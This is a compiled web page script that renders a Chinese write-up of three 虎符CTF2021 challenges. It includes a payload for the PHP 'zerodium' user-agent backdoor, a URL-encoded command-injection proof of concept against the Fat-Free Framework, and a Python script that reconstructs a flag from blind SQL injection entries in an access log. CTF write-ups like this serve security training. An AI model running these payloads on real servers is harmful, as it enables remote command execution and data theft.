(window.webpackJsonp=window.webpackJsonp||[]).push([[84],{408:function(t,s,a){"use strict";a.r(s);var n=a(3),r=Object(n.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h2",{attrs:{id:"虎符ctf2021"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#虎符ctf2021"}},[t._v("#")]),t._v(" 虎符CTF2021")]),t._v(" "),s("h2",{attrs:{id:"_0x01-签到"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_0x01-签到"}},[t._v("#")]),t._v(" 0x01 签到")]),t._v(" "),s("p",[t._v("题目来源是一个新闻，")]),t._v(" "),s("p",[t._v("https://www.freebuf.com/news/267983.html")]),t._v(" "),s("p",[t._v("看git commit可以得知我们通过")]),t._v(" "),s("p",[t._v("user-agentt直接进行命令执行")]),t._v(" "),s("p",[t._v('所以直接user-agentt: zerodiumsystem("cat /flag");\n即可。')]),t._v(" "),s("h2",{attrs:{id:"unsetme"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#unsetme"}},[t._v("#")]),t._v(" unsetme")]),t._v(" "),s("p",[t._v("fatfree unset eval 命令拼接CVE")]),t._v(" "),s("p",[t._v("poc:")]),t._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v("0%0a);echo%20`cat%20/flag`;print(%27%27\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br")])]),s("p",[t._v("得到flag")]),t._v(" "),s("h2",{attrs:{id:"你会日志分析吗"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#你会日志分析吗"}},[t._v("#")]),t._v(" 你会日志分析吗")]),t._v(" "),s("p",[t._v("sql盲注反推")]),t._v(" "),s("div",{staticClass:"language-py line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-py"}},[s("code",[s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" re\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("from")]),t._v(" datetime "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" datetime\n\nf "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("open")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"access.log"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"r"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\nraw "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" f"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("read"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\npattern "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('r"192\\.168\\.52\\.156 - - \\[11\\/Mar\\/2021:(\\d+:\\d+:\\d+) \\+0000\\] \\"GET \\/index\\.php\\?id=1\'%20and%20if\\(ord\\(substr\\(\\(select%20flag%20from%20flllag\\),(\\d+),1\\)\\)=(\\d+),sleep\\(2\\),1\\)--"')]),t._v("\n\nmatches "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("  re"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("findall"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("pattern"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("raw"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nl_time "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" datetime"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("strptime"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"18:00:57"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'%H:%M:%S'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\ni_time "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" datetime"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("strptime"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"18:00:57"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'%H:%M:%S'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\npos "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('""')]),t._v("\nch "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('""')]),t._v("\nlastmatch "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('""')]),t._v("\n\ndic "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'0'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("48")]),t._v("\n\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("match")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("in")]),t._v(" matches"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n    pos "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("match")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\n    ch  "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("match")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#print(chr(int(ch)))")]),t._v("\n    l_time "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" i_time \n    i_time "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" datetime"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("strptime"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("match")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'%H:%M:%S'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#print((i_time-l_time).seconds)")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("i_time"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("l_time"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("seconds"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">=")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n        "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("i_time"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("l_time"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n        "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("lastmatch"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("match")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n        dic"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("int")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("lastmatch"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("chr")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("int")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("lastmatch"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    lastmatch "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("match")]),t._v("\n\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("''")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("join"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("dic"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br"),s("span",{staticClass:"line-number"},[t._v("5")]),s("br"),s("span",{staticClass:"line-number"},[t._v("6")]),s("br"),s("span",{staticClass:"line-number"},[t._v("7")]),s("br"),s("span",{staticClass:"line-number"},[t._v("8")]),s("br"),s("span",{staticClass:"line-number"},[t._v("9")]),s("br"),s("span",{staticClass:"line-number"},[t._v("10")]),s("br"),s("span",{staticClass:"line-number"},[t._v("11")]),s("br"),s("span",{staticClass:"line-number"},[t._v("12")]),s("br"),s("span",{staticClass:"line-number"},[t._v("13")]),s("br"),s("span",{staticClass:"line-number"},[t._v("14")]),s("br"),s("span",{staticClass:"line-number"},[t._v("15")]),s("br"),s("span",{staticClass:"line-number"},[t._v("16")]),s("br"),s("span",{staticClass:"line-number"},[t._v("17")]),s("br"),s("span",{staticClass:"line-number"},[t._v("18")]),s("br"),s("span",{staticClass:"line-number"},[t._v("19")]),s("br"),s("span",{staticClass:"line-number"},[t._v("20")]),s("br"),s("span",{staticClass:"line-number"},[t._v("21")]),s("br"),s("span",{staticClass:"line-number"},[t._v("22")]),s("br"),s("span",{staticClass:"line-number"},[t._v("23")]),s("br"),s("span",{staticClass:"line-number"},[t._v("24")]),s("br"),s("span",{staticClass:"line-number"},[t._v("25")]),s("br"),s("span",{staticClass:"line-number"},[t._v("26")]),s("br"),s("span",{staticClass:"line-number"},[t._v("27")]),s("br"),s("span",{staticClass:"line-number"},[t._v("28")]),s("br"),s("span",{staticClass:"line-number"},[t._v("29")]),s("br"),s("span",{staticClass:"line-number"},[t._v("30")]),s("br"),s("span",{staticClass:"line-number"},[t._v("31")]),s("br"),s("span",{staticClass:"line-number"},[t._v("32")]),s("br")])])])}),[],!1,null,null,null);s.default=r.exports}}]);